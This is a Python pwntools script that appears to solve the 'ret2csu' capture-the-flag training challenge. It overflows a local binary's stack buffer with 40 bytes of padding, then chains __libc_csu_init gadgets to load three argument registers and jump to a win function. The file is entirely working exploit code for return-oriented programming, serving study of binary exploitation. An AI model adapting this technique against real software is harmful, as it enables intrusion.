#!/usr/bin/python

from pwn import *

context.update(os='linux',arch='amd64',bits=64,endian='little')

p = process('ret2csu')
e = ELF('ret2csu')

gdb.attach(p,
'''
b* 0x400689
b* 0x400680
c
''')

init = 0x600e38
win = 0x400510
main = 0x400607
pop_rdi = 0x4006a3

def ret2csu(call,rdi,rsi,rdx):
	payload = p64(0x40069a,endian='little')
	payload += p64(0x00)            # pop rbx
	payload += p64(0x01)            # pop rbp
	payload += p64(init)    # pop r12
	payload += p64(rdi)            # pop r13 #rdi
	payload += p64(rsi)            # pop r14 #rsi
	payload += p64(rdx) # pop r15 #rdx
	payload += p64(0x400680)
	payload += p64(0x00)            # add rsp,0x8 padding
	payload += p64(0x00)            # rbx
	payload += p64(0x00)            # rbp
	payload += p64(0x00)            # r12
	payload += p64(0x00)            # r13
	payload += p64(0x00)            # r14
	payload += p64(0x00)            # r15
	payload += p64(call)
	payload += p64(rdi)

	return payload

ret = 0x4004e6

payload = ret2csu(pop_rdi, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) #call(rdi,rsi,rdx)
payload += p64(ret) + p64(win) # return

eip = b'A'*40
rop = eip + payload

p.recvuntil('> ')
p.sendline(rop)
print(p.recvallS())
p.interactive()